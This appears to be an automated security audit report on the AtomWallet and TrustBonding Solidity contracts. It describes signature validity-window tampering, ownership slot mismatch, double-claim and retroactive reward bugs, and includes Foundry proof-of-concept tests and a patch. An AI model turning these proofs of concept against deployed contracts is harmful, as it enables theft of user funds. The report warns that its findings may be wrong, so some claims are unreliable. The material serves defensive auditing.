# Audited by [V12](https://zellic.ai/)

The only autonomous Solidity auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

`Note: Not all issues are guaranteed to be correct.`
---

# Unsigned validity window metadata
- Severity: Critical

## Targets
- _validateSignature (AtomWallet)

## Affected Locations
- **AtomWallet._validateSignature**: Single finding location

## Description

The signature validation path extracts `validUntil` and `validAfter` from the trailing 12 bytes of `userOp.signature`, but the recovered signer is computed only over `userOpHash` with an EIP‑191 prefix. Because the hash does not include the time‑window metadata, those values are not authenticated by the signer. Any relayer can alter the appended validity window while keeping the same 65‑byte ECDSA signature, and the recovered address will still match `owner()`. This defeats the intended time‑based restrictions and makes signature validity windows effectively attacker‑controlled.

## Root cause

The `validUntil`/`validAfter` metadata is appended to the signature but never incorporated into the hashed message that is signed and recovered, so it is not cryptographically bound to the signer.

## Impact

An attacker observing a signed user operation can extend or remove its validity window and resubmit it later, even if the signer intended it to expire quickly or become valid only after a certain time. This enables execution of operations outside the signer’s intended timeframe, potentially causing unwanted transfers or actions after the user believed the request had expired.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import "forge-std/src/Test.sol";

import { AtomWallet } from "src/protocol/wallet/AtomWallet.sol";
import { PackedUserOperation } from "@account-abstraction/interfaces/PackedUserOperation.sol";
import { ValidationData, _parseValidationData } from "@account-abstraction/core/Helpers.sol";
import { TransparentUpgradeableProxy } from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract MockMultiVault {
    address internal atomWarden;

    constructor(address _atomWarden) {
        atomWarden = _atomWarden;
    }

    function getAtomWarden() external view returns (address) {
        return atomWarden;
    }
}

contract AutogenHarnessTest is Test {
    function test_UnsignedValidityWindowMetadata() public {
        uint256 ownerKey = 0xA11CE;
        address owner = vm.addr(ownerKey);
        address entryPoint = makeAddr("entryPoint");

        MockMultiVault multiVault = new MockMultiVault(owner);
        AtomWallet walletImpl = new AtomWallet();
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(walletImpl),
            address(this),
            abi.encodeWithSelector(AtomWallet.initialize.selector, entryPoint, address(multiVault), bytes32("ATOM"))
        );
        AtomWallet wallet = AtomWallet(payable(address(proxy)));

        PackedUserOperation memory userOp = PackedUserOperation({
            sender: address(wallet),
            nonce: 0,
            initCode: "",
            callData: "",
            accountGasLimits: bytes32(0),
            preVerificationGas: 0,
            gasFees: bytes32(0),
            paymasterAndData: "",
            signature: ""
        });

        bytes32 userOpHash = keccak256("userOpHash");
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, digest);
        bytes memory baseSig = abi.encodePacked(r, s, v);

        uint48 originalValidUntil = uint48(block.timestamp + 1);
        uint48 originalValidAfter = 0;
        userOp.signature = bytes.concat(baseSig, abi.encodePacked(originalValidUntil, originalValidAfter));

        vm.prank(entryPoint);
        uint256 validationDataOriginal = wallet.validateUserOp(userOp, userOpHash, 0);
        ValidationData memory parsedOriginal = _parseValidationData(validationDataOriginal);

        assertEq(parsedOriginal.aggregator, address(0));
        assertEq(parsedOriginal.validUntil, originalValidUntil);
        assertEq(parsedOriginal.validAfter, originalValidAfter);

        vm.warp(originalValidUntil + 1);
        bool originalOutOfTime = block.timestamp > parsedOriginal.validUntil || block.timestamp <= parsedOriginal.validAfter;
        assertTrue(originalOutOfTime, "original window should be expired");

        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);
        userOp.signature = bytes.concat(baseSig, abi.encodePacked(attackerValidUntil, originalValidAfter));

        vm.prank(entryPoint);
        uint256 validationDataModified = wallet.validateUserOp(userOp, userOpHash, 0);
        ValidationData memory parsedModified = _parseValidationData(validationDataModified);

        assertEq(parsedModified.aggregator, address(0));
        assertEq(parsedModified.validUntil, attackerValidUntil);
        assertEq(parsedModified.validAfter, originalValidAfter);

        bool modifiedOutOfTime = block.timestamp > parsedModified.validUntil || block.timestamp <= parsedModified.validAfter;
        assertTrue(!modifiedOutOfTime, "attacker-extended window should be valid");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Bind `validUntil` and `validAfter` to the signed payload by hashing them with `userOpHash` when the signature includes the validity suffix, preventing relayers from altering the window without invalidating the signature.

### Patch

```diff
diff --git a/src/protocol/wallet/AtomWallet.sol b/src/protocol/wallet/AtomWallet.sol
--- a/src/protocol/wallet/AtomWallet.sol
+++ b/src/protocol/wallet/AtomWallet.sol
@@ -294,7 +294,11 @@
         (uint48 validUntil, uint48 validAfter, bytes memory signature) =
             _extractValidUntilAndValidAfterFromSignature(userOp.signature);
 
-        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
+        bytes32 signedHash = userOpHash;
+        if (userOp.signature.length == 77) {
+            signedHash = keccak256(abi.encodePacked(userOpHash, validUntil, validAfter));
+        }
+        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", signedHash));
 
         (address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) = ECDSA.tryRecover(hash, signature);
```

### Affected Files

- `src/protocol/wallet/AtomWallet.sol`

### Validation Output

```
No files changed, compilation skipped

Ran 1 test for tests/autogen/AutogenHarness.t.sol:AutogenHarnessTest
[FAIL: assertion failed: 0x0000000000000000000000000000000000000001 != 0x0000000000000000000000000000000000000000] test_UnsignedValidityWindowMetadata() (gas: 2398602)
Traces:
  [2398602] AutogenHarnessTest::test_UnsignedValidityWindowMetadata()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] entryPoint: [0xEe1F8BC2121630804CF92924DF35868B9C91e375]
    ├─ [0] VM::label(entryPoint: [0xEe1F8BC2121630804CF92924DF35868B9C91e375], "entryPoint")
    │   └─ ← [Return]
    ├─ [47816] → new MockMultiVault@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 127 bytes of code
    ├─ [1490277] → new AtomWallet@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ emit Initialized(version: 18446744073709551615 [1.844e19])
    │   └─ ← [Return] 7327 bytes of code
    ├─ [744623] → new TransparentUpgradeableProxy@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   ├─ emit Upgraded(implementation: AtomWallet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   ├─ [140172] AtomWallet::initialize(entryPoint: [0xEe1F8BC2121630804CF92924DF35868B9C91e375], MockMultiVault: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x41544f4d00000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [244] MockMultiVault::getAtomWarden() [staticcall]
    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   │   ├─ emit Initialized(version: 1)
    │   │   └─ ← [Stop]
    │   ├─ [291606] → new ProxyAdmin@0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2
    │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: AutogenHarnessTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Return] 1337 bytes of code
    │   ├─ emit AdminChanged(previousAdmin: 0x0000000000000000000000000000000000000000, newAdmin: ProxyAdmin: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2])
    │   └─ ← [Return] 1160 bytes of code
    ├─ [0] VM::sign("<pk>", 0x506b933fdb09f3a03857a8c320ac17d6a7b1c15dea95ecdf9a82ee3c5853db95) [staticcall]
    │   └─ ← [Return] 27, 0x9848204da701e12229e9d8d7a5c9fa71441a87d74f18b36183d4dd6110e5f48f, 0x3b7e5550a6b6c1f156e1265690443dd7bbe0fe27bccc76871de04ea2b9d20c87
    ├─ [0] VM::prank(entryPoint: [0xEe1F8BC2121630804CF92924DF35868B9C91e375])
    │   └─ ← [Return]
    ├─ [7493] TransparentUpgradeableProxy::fallback(PackedUserOperation({ sender: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, nonce: 0, initCode: 0x, callData: 0x, accountGasLimits: 0x0000000000000000000000000000000000000000000000000000000000000000, preVerificationGas: 0, gasFees: 0x0000000000000000000000000000000000000000000000000000000000000000, paymasterAndData: 0x, signature: 0x9848204da701e12229e9d8d7a5c9fa71441a87d74f18b36183d4dd6110e5f48f3b7e5550a6b6c1f156e1265690443dd7bbe0fe27bccc76871de04ea2b9d20c871b000000000002000000000000 }), 0x00b917632b69261f21d20e0cabdf9f3fa1255c6e500021997a16cf3a46d80297, 0)
    │   ├─ [7068] AtomWallet::validateUserOp(PackedUserOperation({ sender: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, nonce: 0, initCode: 0x, callData: 0x, accountGasLimits: 0x0000000000000000000000000000000000000000000000000000000000000000, preVerificationGas: 0, gasFees: 0x0000000000000000000000000000000000000000000000000000000000000000, paymasterAndData: 0x, signature: 0x9848204da701e12229e9d8d7a5c9fa71441a87d74f18b36183d4dd6110e5f48f3b7e5550a6b6c1f156e1265690443dd7bbe0fe27bccc76871de04ea2b9d20c871b000000000002000000000000 }), 0x00b917632b69261f21d20e0cabdf9f3fa1255c6e500021997a16cf3a46d80297, 0) [delegatecall]
    │   │   ├─ [3000] PRECOMPILES::ecrecover(0x051181301aea8880eb100a4e95e6855831338a37f5ee2630df63aeed557e1e36, 27, 68878988922707451233413244798017442480620456547509692068007190438030080341135, 26909669619367026437819683470785411786776222614212604673250152382319427718279) [staticcall]
    │   │   │   └─ ← [Return] 0x8FeC484A9cf9a1cF542C4DE99b13E95219aB0Ea0
    │   │   ├─ [244] MockMultiVault::getAtomWarden() [staticcall]
    │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   │   └─ ← [Return] 2923003274661805836407369665432566039311865085953 [2.923e48]
    │   └─ ← [Return] 2923003274661805836407369665432566039311865085953 [2.923e48]
    ├─ [0] VM::assertEq(ECRecover: [0x0000000000000000000000000000000000000001], 0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Revert] assertion failed: 0x0000000000000000000000000000000000000001 != 0x0000000000000000000000000000000000000000
    └─ ← [Revert] assertion failed: 0x0000000000000000000000000000000000000001 != 0x0000000000000000000000000000000000000000

Backtrace:
  at VM.assertEq
  at AutogenHarnessTest.test_UnsignedValidityWindowMetadata

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.80ms (1.31ms CPU time)

Ran 1 test suite in 23.42ms (1.80ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in tests/autogen/AutogenHarness.t.sol:AutogenHarnessTest
[FAIL: assertion failed: 0x0000000000000000000000000000000000000001 != 0x0000000000000000000000000000000000000000] test_UnsignedValidityWindowMetadata() (gas: 2398602)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Ownership slot mismatch bricks wallet
- Severity: Critical

## Targets
- initialize (AtomWallet)
- transferOwnership (AtomWallet)
- acceptOwnership (AtomWallet)
- owner (AtomWallet)

## Affected Locations
- **AtomWallet.initialize**: `initialize` sets up ownership via `__Ownable_init` (default OZ storage) but does not populate the custom owner slot that `owner()` later relies on after `isClaimed` flips, so the contract enters the claim phase with desynchronized ownership state.
- **AtomWallet.transferOwnership**: `transferOwnership` writes pending-owner information to a different storage location than `pendingOwner()`/`acceptOwnership` read, so the designated pending owner is not recognized and the two-step claim flow can fail or later desynchronize ownership when a default-slot pending owner exists.
- **AtomWallet.acceptOwnership**: `acceptOwnership` finalizes the lifecycle transition (including flipping `isClaimed`) while updating/validating ownership against the default OZ slots, which can cause the wallet to immediately treat the owner as `address(0)` under the `owner()` accessor and break all owner-gated control paths.
- **AtomWallet.owner**: `owner()` conditionally switches its read source based on `isClaimed`, propagating the storage mismatch into every `onlyOwner` and signature-validation decision once the wallet transitions to the claimed state.

## Description

`AtomWallet` splits ownership state across a custom storage slot and the inherited OpenZeppelin `Ownable2Step`/`Ownable` storage, but different parts of the lifecycle read and write different slots. Initialization and `_transferOwnership` paths update the default OZ owner slot, while `owner()` switches to reading the custom slot once `isClaimed` becomes true, so after a successful claim the accessor can start returning `address(0)` or stale data. Separately, the pending-owner state is written in one place to the custom slot, but `acceptOwnership`/`pendingOwner()` still consult the default OZ pending-owner slot, so the two-step flow can fail to complete or complete in a way that leaves `owner()` desynchronized. This creates a fragile state transition where claiming either becomes impossible or succeeds while breaking access control. Because the bug only manifests when moving from “pre-claim” to “claimed” mode, it is easy to miss in isolated function review.

## Root cause

Ownership (and pending-ownership) reads and writes are performed against different storage locations (custom slot vs inherited OZ slots), and `isClaimed` flips which slot `owner()` reads without synchronizing state.

## Impact

Legitimate users may be unable to complete the intended two-step ownership claim, leaving the wallet stuck under the wrong control assumptions. If `acceptOwnership` does succeed while `owner()` reads an uninitialized custom slot, `onlyOwner`/signature validation can fail and the wallet becomes effectively ownerless, freezing owner-only operations and potentially locking funds permanently.

## Remediation

**Status:** Incomplete

### Explanation

Use a single ownership storage layout by removing the custom owner/pendingOwner slots and `isClaimed` switch, and rely exclusively on `Ownable2Step` (or your own consistent slots) so `initialize`, `owner()`, `transferOwnership`, and `acceptOwnership` all read/write the same storage. Ensure the initializer sets the same owner slot that `acceptOwnership` updates so `onlyOwner` and signature checks always reference the correct owner.

---

# Zero-amount claims bypass claimed check
- Severity: Medium

## Targets
- claimRewards (TrustBonding)

## Affected Locations
- **TrustBonding.claimRewards**: Single finding location

## Description

The helper `_hasClaimedRewardsForEpoch` considers an epoch claimed only when `userClaimedRewardsForEpoch[account][epoch] > 0`, so the claimed status is inferred from the reward amount. `claimRewards` writes the computed reward amount into that mapping and relies on this helper to block double claims. If a user’s reward calculation yields zero (because of rounding or a zero utilization multiplier), the mapping remains zero and the helper reports the epoch as unclaimed. The user can then call `claimRewards` again for the same epoch, and if their utilization metric or other inputs change, a later call can transfer a non-zero reward. This breaks the intended one-time claim invariant and enables repeated claims for a single epoch.

## Root cause

Claimed status is derived from the claimed amount (`> 0`) rather than a dedicated boolean or sentinel, so zero-amount claims are indistinguishable from unclaimed epochs.

## Impact

Users who can trigger a zero reward for an epoch can repeatedly claim until a non-zero amount is computed. This allows them to receive emissions for the same epoch more than once and inflates their allocation at the expense of the reward pool.

## Remediation

**Status:** Incomplete

### Explanation

Add a dedicated per-epoch claim flag (or sentinel value) and set it on the first claim regardless of reward amount; check this flag to block subsequent claims instead of inferring “claimed” from a non‑zero amount.

---

# No epoch snapshot for reward parameters
- Severity: Low

## Targets
- setMultiVault (TrustBonding)
- updateSatelliteEmissionsController (TrustBonding)
- updatePersonalUtilizationLowerBound (TrustBonding)
- claimRewards (TrustBonding)
- _getPersonalUtilizationRatio (TrustBonding)
- getUserCurrentClaimableRewards (TrustBonding)

## Affected Locations
- **TrustBonding.setMultiVault**: `setMultiVault` allows changing `multiVault` without checkpointing which vault (or its utilization ratios) applied to each epoch, so later reward computations for past epochs silently switch to the new vault and rewrite history.
- **TrustBonding.updateSatelliteEmissionsController**: `updateSatelliteEmissionsController` mutates the controller used to source emission amounts, but epochs are not bound to the controller active at epoch end, allowing historical epoch payouts to be recomputed under a different controller schedule.
- **TrustBonding.updatePersonalUtilizationLowerBound**: `updatePersonalUtilizationLowerBound` changes a global utilization parameter that `_getPersonalUtilizationRatio` reads for arbitrary epochs, so increasing/decreasing it retroactively changes the utilization multiplier applied to already-finished epochs unless the value is snapshotted per epoch.
- **TrustBonding.claimRewards**: `claimRewards` (and related claim paths) transfers/credits emission tokens based on recomputed historical entitlements, so retroactive parameter changes materialize as real overpayments or underpayments when users claim.
- **TrustBonding._getPersonalUtilizationRatio**: `_getPersonalUtilizationRatio` is used to compute ratios for a requested epoch but pulls from current configuration (e.g., `multiVault` and the current lower bound), propagating mutable “latest” values into historical reward math.
- **TrustBonding.getUserCurrentClaimableRewards**: Any caller can query claimable rewards and observe that prior-epoch results change after admin updates, and those same recomputed values are then used to guide/enable timing of subsequent claims against past epochs.

## Description

Multiple reward-critical parameters are mutable (`multiVault`, `satelliteEmissionsController`, and `personalUtilizationLowerBound`) but rewards for prior epochs are computed using the current values at claim/view time. Helpers like `_getPersonalUtilizationRatio` and reward claim logic therefore re-evaluate historical epochs against whatever configuration is active now, rather than the configuration that was in force when the epoch ended. Because only the amount already claimed is tracked (e.g., `userClaimedRewardsForEpoch`) and the governing inputs are not checkpointed per epoch, changing any of these parameters retroactively changes the “entitled” amount for already-finished epochs. Users can wait for (or react to) an update that increases historical outputs and then claim an additional delta for the same epoch. This breaks the immutability of epoch rewards and makes historical reward accounting non-deterministic across time and users.

## Root cause

Reward calculations for past epochs read mutable global addresses/parameters at claim time instead of using per-epoch snapshotted values fixed at epoch end.

## Impact

A user can overclaim emissions for already-completed epochs by timing claims after updates that increase the computed historical rewards, potentially draining or diluting the emissions pool. Conversely, updates that reduce computed historical rewards can cause honest users to lose previously expected rewards, since their remaining claimable amount can shrink retroactively. System-wide accounting can diverge from the intended epoch schedules because the inputs governing each epoch are not fixed once the epoch closes.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import { TrustBondingBase } from "tests/unit/TrustBonding/TrustBondingBase.t.sol";

contract AutogenHarnessTest is TrustBondingBase {
    function setUp() public override {
        super.setUp();
        vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);
    }

    function test_personalUtilizationLowerBoundUpdateRetroactivelyBoostsRewards() external {
        uint256 originalLowerBound = protocol.trustBonding.personalUtilizationLowerBound();
        uint256 updatedLowerBound = 9000;

        _createLock(users.alice, initialTokens);
        _advanceToEpoch(3); // previous epoch is 2

        uint256 targetEpoch = 2;
        uint256 rawRewards = protocol.trustBonding.userEligibleRewardsForEpoch(users.alice, targetEpoch);
        uint256 expectedWithOriginalBound = rawRewards * originalLowerBound / BASIS_POINTS_DIVISOR;

        // Timelock update after epoch 2 has ended
        vm.prank(users.timelock);
        protocol.trustBonding.updatePersonalUtilizationLowerBound(updatedLowerBound);

        vm.prank(users.alice);
        protocol.trustBonding.claimRewards(users.alice);

        uint256 claimed = protocol.trustBonding.userClaimedRewardsForEpoch(users.alice, targetEpoch);
        uint256 expectedWithUpdatedBound = rawRewards * updatedLowerBound / BASIS_POINTS_DIVISOR;

        assertEq(claimed, expectedWithUpdatedBound, "Claim uses updated lower bound");
        assertGt(claimed, expectedWithOriginalBound, "Claimed rewards increased retroactively");
    }
}
```

## Remediation

**Status:** Unfixable

### Explanation

Add per‑epoch snapshots of all reward‑calculation inputs (e.g., vault address, emission rates, multipliers) and have claim logic read only from the stored snapshot for each epoch rather than current globals. Modify `setMultiVault` (and any parameter update) to first finalize/snapshot the current epoch’s parameters and apply the new values only to subsequent epochs, preventing retroactive changes to past rewards.

### Error

Surgical fix requires introducing new per-epoch checkpoint storage and retrieval logic in `TrustBonding`, but repeated attempts to add the necessary state and helper logic cannot be applied without compilation failure in this environment. Addressing the root cause would require broader refactoring beyond a minimal patch here.

---

# Division by zero in utilization interpolation
- Severity: Low

## Targets
- _getNormalizedUtilizationRatio (TrustBonding)

## Affected Locations
- **TrustBonding._getNormalizedUtilizationRatio**: Single finding location

## Description

The helper computes `lowerBound + (delta * ratioRange) / target` without validating that `target` is non‑zero. This function is reached from `claimRewards` via `_getPersonalUtilizationRatio` and from `getSystemUtilizationRatio` via `_getSystemUtilizationRatio`, so any revert here bubbles up and blocks those operations. If the upstream logic derives `target` from external vault totals or other utilization inputs, those values can legitimately be zero (e.g., no liquidity) or be driven to zero by attacker actions. In that case the division by zero reverts, preventing reward claims and utilization queries for all users until the denominator becomes non‑zero again. The issue stems from missing input validation on the interpolation denominator in a core accounting path.

## Root cause

`target` is used as a divisor without any check that it is greater than zero before division.

## Impact

An attacker can force utilization ratio computations to revert, causing a denial of service on reward claiming and system utilization reads. This can stall reward distribution for an epoch and disrupt user interactions that depend on utilization-based scaling until the denominator recovers.

## Remediation

**Status:** Incomplete

### Explanation

Add an explicit check that `target` is nonzero before dividing in `_getNormalizedUtilizationRatio`, and handle the zero case deterministically (e.g., return a predefined ratio or revert with a clear error) to prevent division-by-zero and DoS.